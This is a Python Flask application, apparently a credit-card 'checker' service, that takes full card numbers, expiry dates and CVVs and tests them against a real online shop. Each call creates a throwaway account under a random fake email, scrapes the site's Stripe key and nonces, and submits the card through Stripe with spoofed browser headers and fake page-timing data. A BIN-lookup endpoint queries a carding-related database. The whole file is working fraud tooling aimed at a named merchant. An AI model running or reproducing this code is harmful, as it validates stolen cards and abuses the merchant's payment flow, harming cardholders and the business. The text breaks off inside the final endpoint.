import os
from flask import Flask, jsonify, Response
import requests
import re
import json
import random
from datetime import datetime
import time

app = Flask(__name__)

# Email domains for random generation
EMAIL_DOMAINS = [
    'gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 
    'icloud.com', 'protonmail.com', 'mail.com', 'aol.com',
    'yandex.com', 'zoho.com'
]

# Common first names and last names for email generation
FIRST_NAMES = [
    'john', 'jane', 'michael', 'sarah', 'david', 'lisa', 'robert', 'emily',
    'william', 'jennifer', 'richard', 'susan', 'joseph', 'maria', 'thomas',
    'karen', 'charles', 'nancy', 'christopher', 'betty', 'daniel', 'sandra',
    'matthew', 'ashley', 'anthony', 'kimberly', 'donald', 'emma', 'mark',
    'elizabeth', 'paul', 'michelle', 'steven', 'amanda', 'andrew', 'melissa',
    'joshua', 'deborah', 'kevin', 'stephanie', 'brian', 'rebecca', 'george',
    'laura', 'edward', 'sharon', 'ronald', 'cynthia', 'timothy', 'kathleen'
]

LAST_NAMES = [
    'smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller',
    'davis', 'rodriguez', 'martinez', 'hernandez', 'lopez', 'gonzalez',
    'wilson', 'anderson', 'thomas', 'taylor', 'moore', 'jackson', 'martin',
    'lee', 'perez', 'thompson', 'white', 'harris', 'sanchez', 'clark',
    'ramirez', 'lewis', 'robinson', 'walker', 'young', 'allen', 'king',
    'wright', 'scott', 'torres', 'nguyen', 'hill', 'flores', 'green',
    'adams', 'nelson', 'baker', 'hall', 'rivera', 'campbell', 'mitchell',
    'carter', 'roberts'
]

@app.route('/')
def home():
    return """
    <html>
        <head><title>Payment Method API</title></head>
        <body>
            <h1>API is running</h1>
            <h2>Endpoints:</h2>
            <ul>
                <li><b>/add_payment_method/&lt;cc|mm|yy|cvv&gt;</b> - Auto generate email and add payment method</li>
                <li><b>/add_payment_method_with_email/&lt;email&gt;/&lt;cc|mm|yy|cvv&gt;</b> - Use specific email</li>
                <li><b>/register_user</b> - Register random user</li>
                <li><b>/register_user_with_email/&lt;email&gt;</b> - Register specific email</li>
                <li><b>/bin_lookup/&lt;bin&gt;</b> - BIN information lookup</li>
                <li><b>/generate_emails/&lt;count&gt;</b> - Generate multiple emails</li>
            </ul>
            <p>Format: cc|mm|yy|cvv (e.g., 4111111111111111|12|25|123)</p>
        </body>
    </html>
    """

def generate_random_email():
    """Generate a realistic random email address."""
    
    # Choose random name combination
    first_name = random.choice(FIRST_NAMES)
    last_name = random.choice(LAST_NAMES)
    domain = random.choice(EMAIL_DOMAINS)
    
    # Decide email format (various common patterns)
    email_patterns = [
        f"{first_name}.{last_name}",
        f"{first_name}{last_name}",
        f"{first_name}_{last_name}",
        f"{first_name[0]}{last_name}",
        f"{first_name}{random.randint(1, 999)}",
        f"{first_name}{last_name[0]}",
        f"{first_name}{random.randint(10, 99)}{last_name}",
        f"{first_name[0]}.{last_name}",
    ]
    
    username = random.choice(email_patterns)
    return f"{username}@{domain}".lower()

def extract_stripe_public_key(html_content):
    """Extract Stripe public key from HTML content."""
    
    # Pattern 1: Look for Stripe public key in script tags
    patterns = [
        # Pattern for wc_stripe_params
        r'"stripe":\s*{[^}]+"key":\s*"([^"]+)"',
        # Pattern for stripe publishableKey
        r'"publishableKey":\s*"([^"]+)"',
        # Pattern for pk_live_ or pk_test_ in scripts
        r'"pk_(live|test)_[^"]+"',
        # Direct key pattern
        r'pk_(live|test)_[A-Za-z0-9_]+',
        # In wc_stripe_params object
        r'var\s+wc_stripe_(?:upe_)?params\s*=\s*({[^}]+})',
        # New pattern for modern WooCommerce Stripe
        r'stripe\.js\/v3\/[\s\S]*?["\'](pk_(?:live|test)_[A-Za-z0-9_]+)["\']',
        # Pattern for Stripe elements initialization
        r'stripe\.elements\s*\(\s*{[^}]*["\']pk_(?:live|test)_[A-Za-z0-9_]+["\'][^}]*}',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, html_content, re.DOTALL | re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            
            # If we found the full params object, parse it
            if pattern == patterns[4] and match.startswith('{'):
                try:
                    # Clean JSON
                    cleaned = re.sub(r',\s*}', '}', match)
                    cleaned = re.sub(r',\s*]', ']', cleaned)
                    cleaned = re.sub(r'([{,]\s*)(\w+):', r'\1"\2":', cleaned)
                    params = json.loads(cleaned)
                    if 'key' in params:
                        return params['key']
                    elif 'stripe' in params and 'key' in params['stripe']:
                        return params['stripe']['key']
                except:
                    continue
            
            # Check if it's a Stripe public key
            if match and ('pk_live_' in match or 'pk_test_' in match):
                # Clean up if needed
                if match.startswith('"') and match.endswith('"'):
                    match = match[1:-1]
                elif match.startswith("'") and match.endswith("'"):
                    match = match[1:-1]
                return match
    
    # Additional search in inline scripts
    script_pattern = r'<script[^>]*>(.*?)</script>'
    scripts = re.findall(script_pattern, html_content, re.DOTALL | re.IGNORECASE)
    
    for script in scripts:
        if 'pk_live_' in script or 'pk_test_' in script:
            # Try to extract using more specific patterns
            key_match = re.search(r'["\'](pk_(?:live|test)_[A-Za-z0-9_]+)["\']', script)
            if key_match:
                return key_match.group(1)
    
    return None

def get_stripe_public_key(session, headers):
    """Fetch the website and extract Stripe public key."""
    
    # Try multiple URLs where Stripe key might be present
    urls_to_try = [
        'https://www.dsegni.com/en/my-account/add-payment-method/',
        'https://www.dsegni.com/en/checkout/',
        'https://www.dsegni.com/en/shop/',
        'https://www.dsegni.com/',
        'https://www.dsegni.com/en/my-account/',
        'https://www.dsegni.com/en/cart/',
        'https://www.dsegni.com/en/product/',
    ]
    
    for url in urls_to_try:
        try:
            response = session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                pk_key = extract_stripe_public_key(response.text)
                if pk_key:
                    print(f"Found Stripe key at {url}: {pk_key[:20]}...")
                    return pk_key
        except Exception as e:
            print(f"Error fetching {url}: {e}")
            continue
    
    raise ValueError("Could not extract Stripe public key from any page")

def register_new_user(session, headers, email):
    """Register a new user with only email (no username/password needed)."""
    
    # Step 1: Get the registration page to extract nonce
    register_url = 'https://www.dsegni.com/en/my-account/'
    try:
        response = session.get(register_url, headers=headers, timeout=10)
        if response.status_code != 200:
            return False
        
        html = response.text
        
        # Extract registration nonce
        nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]*)"', html)
        if not nonce_match:
            # Try alternative pattern
            nonce_match = re.search(r'"woocommerce-register-nonce":"([^"]*)"', html)
            if not nonce_match:
                return False
        
        register_nonce = nonce_match.group(1)
        
        # Step 2: Check if email-only registration is supported
        # Look for email-only registration patterns in the form
        if 'email' in html.lower() and 'register' in html.lower():
            # Try email-only registration
            register_data = {
                'email': email,
                'woocommerce-register-nonce': register_nonce,
                'register': 'Register',
                '_wp_http_referer': '/en/my-account/'
            }
            
            register_response = session.post(register_url, headers=headers, data=register_data, allow_redirects=True)
            
            # Check if registration was successful
            if register_response.status_code in [200, 302]:
                success_indicators = [
                    'dashboard',
                    'my account',
                    'registration complete',
                    'your account was created successfully',
                    'account details',
                    'welcome to your account',
                    'check your email',
                    'confirmation email',
                    'woocommerce-message',
                    'success',
                    'from your account dashboard',
                    'hello',
                    'logout'
                ]
                
                page_content_lower = register_response.text.lower()
                if any(indicator in page_content_lower for indicator in success_indicators):
                    print(f"Successfully registered user with email: {email}")
                    return True
                
                # Check if we got redirected to my-account page (success)
                if 'my-account' in register_response.url:
                    print(f"Registration appears successful (redirected to account page) for email: {email}")
                    return True
        
        return False
        
    except Exception as e:
        print(f"Registration error: {e}")
        return False

def validate_email_format(email):
    """Validate email format."""
    email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-z]{2,}$'
    return bool(re.match(email_pattern, email))

def get_current_time_str():
    """Get current time as formatted string."""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def calculate_time_taken(start_time_str, end_time_str):
    """Calculate time difference between start and end times."""
    try:
        start_time = datetime.strptime(start_time_str, "%Y-%m-%d %H:%M:%S")
        end_time = datetime.strptime(end_time_str, "%Y-%m-%d %H:%M:%S")
        time_diff = end_time - start_time
        
        # Format as seconds with 2 decimal places
        seconds = time_diff.total_seconds()
        return f"{seconds:.2f}s"
    except:
        return "N/A"

def fetch_bin_info(bin_number):
    """
    Fetch BIN (Bank Identification Number) information from antipublic API.
    
    Args:
        bin_number: First 6 digits of credit card
    
    Returns:
        Dictionary containing BIN information or error details
    """
    try:
        # Validate BIN
        if not bin_number or len(bin_number) != 6 or not bin_number.isdigit():
            return {"error": "Invalid BIN number. Must be exactly 6 digits."}
        
        # API endpoint
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        
        # Headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'application/json',
            'Referer': 'https://bins.antipublic.cc/'
        }
        
        # Make request
        response = requests.get(url, headers=headers, timeout=5)
        
        # Check response
        if response.status_code == 200:
            data = response.json()
            return {
                "success": True,
                "bin": bin_number,
                "data": data
            }
        elif response.status_code == 404:
            return {
                "error": f"BIN {bin_number} not found in database",
                "status_code": 404
            }
        else:
            return {
                "error": f"API returned status code {response.status_code}",
                "status_code": response.status_code,
                "response_text": response.text[:200] if response.text else ""
            }
            
    except requests.exceptions.Timeout:
        return {
            "error": "BIN lookup timeout (5 seconds)",
            "status_code": 408
        }
    except requests.exceptions.RequestException as e:
        return {
            "error": f"Network error: {str(e)}"
        }
    except json.JSONDecodeError as e:
        return {
            "error": f"Invalid JSON response: {str(e)}"
        }
    except Exception as e:
        return {
            "error": f"Unexpected error: {str(e)}"
        }

def get_stripe_params_and_nonce(session, headers, html_content=None):
    """Extract Stripe parameters and nonce from HTML or fetch fresh."""
    
    if not html_content:
        # Fetch the page
        page_url = 'https://www.dsegni.com/en/my-account/add-payment-method/'
        response = session.get(page_url, headers=headers)
        html_content = response.text
    
    # Extract Stripe params (wc_stripe_params or wc_stripe_upe_params)
    pattern = r"var\s+(wc_stripe_(?:upe_)?params)\s*=\s*(\{.*?\});"
    match = re.search(pattern, html_content, re.DOTALL)
    
    if not match:
        # Try alternative patterns
        patterns = [
            r'wc_stripe_params\s*=\s*({.*?});',
            r'wc_stripe_upe_params\s*=\s*({.*?});',
            r'var\s+wc_stripe_params\s*=\s*({.*?});',
            r'var\s+wc_stripe_upe_params\s*=\s*({.*?});'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content, re.DOTALL)
            if match:
                break
    
    if not match:
        return None, None
    
    params_str = match.group(1) if len(match.groups()) > 0 else match.group(0)
    
    # Clean the JSON string
    try:
        # Remove variable assignment
        params_str = re.sub(r'^\s*var\s+wc_stripe_(?:upe_)?params\s*=\s*', '', params_str)
        params_str = re.sub(r';\s*$', '', params_str)
        
        # Fix common JSON issues
        params_str = re.sub(r',\s*}', '}', params_str)
        params_str = re.sub(r',\s*]', ']', params_str)
        
        # Fix unquoted keys (common in JavaScript objects)
        params_str = re.sub(r'([{,]\s*)(\w+):', r'\1"\2":', params_str)
        
        wc_params = json.loads(params_str)
        
        # Try to get nonce in order of priority
        nonce_keys = [
            'createAndConfirmSetupIntentNonce',
            'create_setup_intent_nonce',
            'setupIntentNonce',
            'ajax_nonce',
            'nonce'
        ]
        
        ajax_nonce = None
        for key in nonce_keys:
            if key in wc_params:
                ajax_nonce = wc_params[key]
                break
        
        return wc_params, ajax_nonce
        
    except Exception as e:
        print(f"Error parsing Stripe params: {e}")
        return None, None

@app.route('/add_payment_method/<details>', methods=['GET'])
def add_payment_method_auto_email(details):
    """Automatically generate email and add payment method with BIN lookup."""
    start_time = get_current_time_str()
    bin_lookup_time = None
    bin_info = None
    
    try:
        # Generate random email
        email = generate_random_email()
        print(f"Generated email: {email}")
        
        # Extract card details from URL path
        parts = details.split('|')
        if len(parts) != 4:
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Invalid card details format. Use cc|mm|yy|cvv',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        cc, mm, yy, cvv = parts
        if not all([cc, mm, yy, cvv]):
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Missing required card details',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        # Clean card number (remove spaces)
        cc = cc.replace(' ', '')
        
        # Perform BIN lookup (extract first 6 digits)
        bin_number = cc[:6] if len(cc) >= 6 else cc
        bin_lookup_start = get_current_time_str()
        bin_info = fetch_bin_info(bin_number)
        bin_lookup_end = get_current_time_str()
        bin_lookup_time = calculate_time_taken(bin_lookup_start, bin_lookup_end)
        
        # Continue with payment method addition
        return _add_payment_method_with_email_and_bin(email, details, start_time, bin_info, bin_lookup_time)
        
    except Exception as e:
        end_time = get_current_time_str()
        response_data = {
            'error': str(e), 
            'Time': calculate_time_taken(start_time, end_time)
        }
        if bin_info:
            response_data['bin_lookup'] = bin_info
        if bin_lookup_time:
            response_data['bin_lookup_time'] = bin_lookup_time
        return jsonify(response_data), 500

@app.route('/add_payment_method_with_email/<email>/<details>', methods=['GET'])
def add_payment_method_with_email(email, details):
    """Add payment method with provided email and include BIN lookup."""
    start_time = get_current_time_str()
    bin_lookup_time = None
    bin_info = None
    
    try:
        # Validate email format
        if not validate_email_format(email):
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Invalid email format', 
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        # Extract card details from URL path
        parts = details.split('|')
        if len(parts) != 4:
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Invalid card details format. Use cc|mm|yy|cvv',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        cc, mm, yy, cvv = parts
        if not all([cc, mm, yy, cvv]):
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Missing required card details',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        # Clean card number (remove spaces)
        cc = cc.replace(' ', '')
        
        # Perform BIN lookup (extract first 6 digits)
        bin_number = cc[:6] if len(cc) >= 6 else cc
        bin_lookup_start = get_current_time_str()
        bin_info = fetch_bin_info(bin_number)
        bin_lookup_end = get_current_time_str()
        bin_lookup_time = calculate_time_taken(bin_lookup_start, bin_lookup_end)
        
        # Continue with payment method addition
        return _add_payment_method_with_email_and_bin(email, details, start_time, bin_info, bin_lookup_time)
        
    except Exception as e:
        end_time = get_current_time_str()
        response_data = {
            'error': str(e), 
            'Time': calculate_time_taken(start_time, end_time)
        }
        if bin_info:
            response_data['bin_lookup'] = bin_info
        if bin_lookup_time:
            response_data['bin_lookup_time'] = bin_lookup_time
        return jsonify(response_data), 500

def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=None, bin_lookup_time=None):
    """Internal function to handle adding payment method with email and BIN info."""
    try:
        # Extract card details from URL path
        parts = details.split('|')
        cc, mm, yy, cvv = parts
        cc = cc.replace(' ', '')  # Clean card number

        # Create a session to persist cookies across requests
        session = requests.Session()

        # Common headers
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'referer': 'https://www.dsegni.com/en/my-account/',
            'accept-encoding': 'gzip, deflate, br',
            'connection': 'keep-alive',
        }

        # Step 1: Register new user with email only
        print(f"Attempting to register user with email: {email}")
        registration_success = register_new_user(session, headers, email)
        
        if not registration_success:
            # Try one more time with a different email if first attempt fails
            print(f"First registration attempt failed for {email}, trying new email...")
            email = generate_random_email()
            print(f"Trying new email: {email}")
            registration_success = register_new_user(session, headers, email)
            
            if not registration_success:
                end_time = get_current_time_str()
                response_data = {
                    'error': 'User registration failed after multiple attempts',
                    'email_tried': email,
                    'Time': calculate_time_taken(start_time, end_time)
                }
                if bin_info:
                    response_data['bin_lookup'] = bin_info
                if bin_lookup_time:
                    response_data['bin_lookup_time'] = bin_lookup_time
                return jsonify(response_data), 500
        
        print(f"Successfully registered user: {email}")

        # Step 2: Dynamically extract Stripe public key
        try:
            Pk_key = get_stripe_public_key(session, headers)
            print(f"Extracted Stripe key: {Pk_key[:20]}...")
        except ValueError as e:
            end_time = get_current_time_str()
            response_data = {
                'error': str(e),
                'Time': calculate_time_taken(start_time, end_time)
            }
            if bin_info:
                response_data['bin_lookup'] = bin_info
            if bin_lookup_time:
                response_data['bin_lookup_time'] = bin_lookup_time
            return jsonify(response_data), 500

        # Step 3: Fetch the add payment method page (now authenticated)
        page_url = 'https://www.dsegni.com/en/my-account/add-payment-method/'
        page_response = session.get(page_url, headers=headers)
        html = page_response.text

        # Extract Stripe parameters and nonce
        wc_params, ajax_nonce = get_stripe_params_and_nonce(session, headers, html)
        
        if not wc_params or not ajax_nonce:
            # Try to extract nonce directly from page
            nonce_patterns = [
                r'name="_wpnonce" value="([^"]+)"',
                r'"ajax_nonce":"([^"]+)"',
                r'nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            ]
            
            for pattern in nonce_patterns:
                nonce_match = re.search(pattern, html)
                if nonce_match:
                    ajax_nonce = nonce_match.group(1)
                    print(f"Found nonce using pattern: {ajax_nonce[:10]}...")
                    break
            
            if not ajax_nonce:
                end_time = get_current_time_str()
                response_data = {
                    'error': 'Could not extract necessary nonce from page',
                    'page_status': page_response.status_code,
                    'Time': calculate_time_taken(start_time, end_time)
                }
                if bin_info:
                    response_data['bin_lookup'] = bin_info
                if bin_lookup_time:
                    response_data['bin_lookup_time'] = bin_lookup_time
                return jsonify(response_data), 500

        print(f"Using nonce: {ajax_nonce[:10]}...")

        # Step 4: Create payment method directly via Stripe API
        stripe_headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        
        # Use the dynamically extracted Stripe public key
        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '10009',
            'billing_details[address][country]': 'US',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent',
            'referrer': 'https://www.dsegni.com',
            'time_on_page': '54564',
            'key': Pk_key,
            '_stripe_version': '2024-06-20'
        }
        
        # Convert to form-urlencoded format
        stripe_data_str = '&'.join([f"{k}={v}" for k, v in stripe_data.items()])
        
        print(f"Creating Stripe payment method for card: {cc[:6]}******{cc[-4:]}")
        pm_response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=stripe_headers,
            data=stripe_data_str,
            timeout=30
        )
        
        try:
            pm_json = pm_response.json()
        except:
            pm_json = {'error': {'message': f'Invalid JSON response: {pm_response.text[:100]}'}}
        
        if 'error' in pm_json:
            end_time = get_current_time_str()
            response_data = {
                'error': f"Stripe PM creation failed: {pm_json['error']['message']}",
                'stripe_response': pm_json,
                'Time': calculate_time_taken(start_time, end_time)
            }
            if bin_info:
                response_data['bin_lookup'] = bin_info
            if bin_lookup_time:
                response_data['bin_lookup_time'] = bin_lookup_time
            return jsonify(response_data), 500
        
        pm_id = pm_json['id']
        print(f"Created payment method: {pm_id}")

        # Step 5: Confirm setup intent via WooCommerce AJAX
        ajax_headers = {
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.dsegni.com',
            'referer': 'https://www.dsegni.com/en/my-account/add-payment-method/',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
        }
        
        # Try multiple AJAX action names
        ajax_actions = [
            'wc_stripe_create_and_confirm_setup_intent',
            'wc_stripe_create_setup_intent',
            'stripe_confirm_setup_intent',
            'wc_stripe_upe_create_and_confirm_setup_intent'
        ]
        
        final_json = None
        for action in ajax_actions:
            ajax_data = {
                'action': action,
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': ajax_nonce,
            }
            
            print(f"Trying AJAX action: {action}")
            final_response = session.post(
                'https://www.dsegni.com/wp-admin/admin-ajax.php',
                headers=ajax_headers,
                data=ajax_data,
                timeout=30
            )
            
            # Check response
            if final_response.status_code == 200:
                try:
                    final_json = final_response.json()
                    print(f"AJAX response for {action}: {str(final_json)[:100]}")
                    
                    # Check if this looks like a successful response
                    if isinstance(final_json, dict) and ('success' in final_json or 'setupIntent' in final_json or 'redirect' in final_json):
                        print(f"Valid response from action: {action}")
                        break
                except:
                    # Not JSON, check if it's a "0" response
                    if final_response.text.strip() == '0':
                        print(f"Got '0' response for action: {action}")
                        final_json = {'raw': '0', 'action_used': action}
                        continue
                    else:
                        final_json = {'raw': final_response.text[:200], 'action_used': action}
                        print(f"Non-JSON response for {action}: {final_response.text[:100]}")
            else:
                print(f"HTTP {final_response.status_code} for action: {action}")
        
        if not final_json:
            final_json = {'error': 'No valid response from any AJAX action'}
        
        end_time = get_current_time_str()
        
        # Prepare response with BIN info if available
        response_data = {
            'success': 'payment_method_id' in locals(),
            'email': email,
            'registration_success': registration_success,
            'stripe_key_used': Pk_key[:20] + '...',
            'ajax_nonce_used': ajax_nonce[:10] + '...',
            'final_response': final_json,
            'Time': calculate_time_taken(start_time, end_time)
        }
        
        if 'payment_method_id' in locals():
            response_data['payment_method_id'] = pm_id
        
        # Add BIN information if available
        if bin_info:
            response_data['bin_lookup'] = bin_info
        if bin_lookup_time:
            response_data['bin_lookup_time'] = bin_lookup_time
        
        # Add card details summary (masked for security)
        bin_number = cc[:6] if len(cc) >= 6 else cc
        response_data['card_summary'] = {
            'bin': bin_number,
            'card_length': len(cc),
            'card_masked': f"{cc[:6]}******{cc[-4:]}" if len(cc) > 10 else cc,
            'expiry': f"{mm}/{yy}"
        }
        
        # Check if final_response is "0" and provide troubleshooting info
        if final_json.get('raw') == '0':
            response_data['troubleshooting'] = {
                'possible_causes': [
                    'Invalid or expired nonce',
                    'User session expired',
                    'WooCommerce hooks failing',
                    'Stripe plugin configuration issue'
                ],
                'suggestions': [
                    'Try re-registering the user',
                    'Check if the site requires additional authentication',
                    'Verify Stripe plugin is active and configured'
                ]
            }
        
        return jsonify(response_data)
        
    except Exception as e:
        end_time = get_current_time_str()
        response_data = {
            'error': str(e),
            'Time': calculate_time_taken(start_time, end_time)
        }
        if bin_info:
            response_data['bin_lookup'] = bin_info
        if bin_lookup_time:
            response_data['bin_lookup_time'] = bin_lookup_time
        return jsonify(response_data), 500

@app.route('/register_user', methods=['GET'])
def register_user_auto():
    """Endpoint to register a random user with email only."""
    start_time = get_current_time_str()
    try:
        email = generate_random_email()
        
        # Create a session
        session = requests.Session()
        
        # Common headers
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'referer': 'https://www.dsegni.com/en/my-account/',
        }
        
        # Register new user with email only
        success = register_new_user(session, headers, email)
        end_time = get_current_time_str()
        
        if success:
            return jsonify({
                'success': True,
                'message': 'User registered successfully with email only',
                'email': email,
                'Time': calculate_time_taken(start_time, end_time)
            })
        else:
            # Try one more time
            email = generate_random_email()
            success = register_new_user(session, headers, email)
            end_time = get_current_time_str()
            
            if success:
                return jsonify({
                    'success': True,
                    'message': 'User registered successfully on second attempt',
                    'email': email,
                    'Time': calculate_time_taken(start_time, end_time)
                })
            else:
                return jsonify({
                    'error': 'User registration failed after multiple attempts',
                    'Time': calculate_time_taken(start_time, end_time)
                }), 500
            
    except Exception as e:
        end_time = get_current_time_str()
        return jsonify({
            'error': str(e),
            'Time': calculate_time_taken(start_time, end_time)
        }), 500

@app.route('/register_user_with_email/<email>', methods=['GET'])
def register_user_with_email_route(email):
    """Endpoint to register a user with specific email only."""
    start_time = get_current_time_str()
    try:
        if not validate_email_format(email):
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Invalid email format',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        # Create a session
        session = requests.Session()
        
        # Common headers
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'referer': 'https://www.dsegni.com/en/my-account/',
        }
        
        # Register new user with email only
        success = register_new_user(session, headers, email)
        end_time = get_current_time_str()
        
        if success:
            return jsonify({
                'success': True,
                'message': f'User {email} registered successfully with email only',
                'email': email,
                'Time': calculate_time_taken(start_time, end_time)
            })
        else:
            return jsonify({
                'error': 'User registration failed',
                'Time': calculate_time_taken(start_time, end_time)
            }), 500
            
    except Exception as e:
        end_time = get_current_time_str()
        return jsonify({
            'error': str(e),
            'Time': calculate_time_taken(start_time, end_time)
        }), 500

@app.route('/generate_emails/<int:count>', methods=['GET'])
def generate_emails(count):
    """Generate multiple random emails."""
    start_time = get_current_time_str()
    try:
        if count < 1 or count > 100:
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Count must be between 1 and 100',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        emails = [generate_random_email() for _ in range(count)]
        end_time = get_current_time_str()
        
        return jsonify({
            'success': True,
            'count': count,
            'emails': emails,
            'Time': calculate_time_taken(start_time, end_time)
        })
    except Exception as e:
        end_time = get_current_time_str()
        return jsonify({
            'error': str(e),
            'Time': calculate_time_taken(start_time, end_time)
        }), 500

@app.route('/bin_lookup/<bin_number>', methods=['GET'])
def bin_lookup(bin_number):
    """
    Endpoint to fetch BIN information.
    
    Usage: /bin_lookup/123456
    Returns: JSON with BIN details including bank, card type, country, etc.
    """
    start_time = get_current_time_str()
    try:
        # Fetch BIN information
        bin_info = fetch_bin_info(bin_number)
        end_time = get_current_time_str()
        
        # Add timing information
        if "success" in bin_info and bin_info["success"]:
            bin_info["Time"] = calculate_time_taken(start_time, end_time)
        else:
            bin_info["Time"] = calculate_time_taken(start_time, end_time)
            bin_info["bin_queried"] = bin_number
        
        return jsonify(bin_info)
        
    except Exception as e:
        end_time = get_current_time_str()
        return jsonify({
            'error': f"Unexpected error: {str(e)}",
            'bin_queried': bin_number,
            'Time': calculate_time_taken(start_time, end_time)
        }), 500

@app.route('/bin_lookup_from_card/<card_details>', methods=['GET'])
def bin_lookup_from_card(card_details):
    """
    Extract BIN from full card details and fetch information.
    
    Usage: /bin_lookup_from_card/123456|mm|yy|cvv
    or /bin_lookup_from_card/1234567890123456|mm|yy|cvv
    """
    start_time = get_current_time_str()
    try:
        # Parse card details
        parts = card_details.split('|')
        if len(parts) < 1:
            end_time = get_current_time_str()
            return jsonify({
                'error': 'Invalid format. Use /bin_lookup_from_card/card_number|mm|yy|cvv or just /bin_lookup_from_card/card_number',
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        card_number = parts[0].strip()
        
        # Extract BIN (first 6 digits)
        if len(card_number) < 6:
            end_time = get_current_time_str()
            return jsonify({
                'error': f'Card number too short for BIN extraction. Need at least 6 digits, got {len(card_number)}',
                'card_number_provided': card_number,
                'Time': calculate_time_taken(start_time, end_time)
            }), 400
        
        bin_number = card_number[:6]
        
        # Fetch BIN information
        bin_info = fetch_bin_info(bin_number)
        end_time = get_current_time_str()
        
        # Add additional information
        if "success" in bin_info and bin_info["success"]:
            bin_info["full_card_length"] = len(card_number)
            bin_info["card_number_masked"] = f"{card_number[:6]}******{card_number[-4:]}" if len(card_number) > 10 else card_number
            bin_info["Time"] = calculate_time_taken(start_time, end_time)
        else:
            bin_info["full_card_length"] = len(card_number)
            bin_info["bin_extracted"] = bin_number
            bin_info["Time"] = calculate_time_taken(start_time, end_time)
        
        return jsonify(bin_info)
        
    except Exception as e:
        end_time = get_current_time_str()
        return jsonify({
            'error': f"Unexpected error: {str(e)}",
            'card_details_provided': card_details,
            'Time': calculate_time_taken(start_time, end_time)
        }), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint."""
    return jsonify({
        'status': 'healthy',
        'timestamp': get_current_time_str(),
        'service': 'payment_method_api'
    })

@app.route('/test_stripe_key', methods=['GET'])
def test_stripe_key():
    """Test endpoint to check if Stripe key extraction is working."""
    start_time = get_current_time_str()
    try:
        session = requests.Session()
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
            'referer': 'https://www.dsegni.com/en/my-account/',
        }
        
        pk_key = get_stripe_public_key(session, headers)
        end_time = get_current_time_str()
        
        return jsonify({
            'success': True,
            'stripe_key_found': True,
            'stripe_key_preview': pk_key[:20] + '...',
            'key_type': 'live' if 'pk_live_' in pk_key else 'test',
            'Time': calculate_time_taken(start_time, end_time)
        })
        
    except Exception as e:
        end_time = get_current_time_str()
        return jsonify({
            'error': str(e),
            'stripe_key_found': False,
            'Time': calculate_time_taken(start_time, end_time)
